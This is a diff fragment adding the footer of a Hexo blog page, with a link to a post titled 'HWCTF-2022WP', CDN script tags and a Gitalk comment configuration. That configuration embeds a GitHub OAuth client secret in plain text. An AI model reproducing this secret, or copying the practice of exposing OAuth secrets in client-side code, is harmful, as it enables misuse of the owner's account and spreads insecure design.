+                <a href="/2022/09/17/HWCTF-2022WP/" rel="prev" title="HWCTF-2022WP">
+                  <i class="fa fa-chevron-left"></i> HWCTF-2022WP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"8e8dcf04c6f401b3a947472b5e980259"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
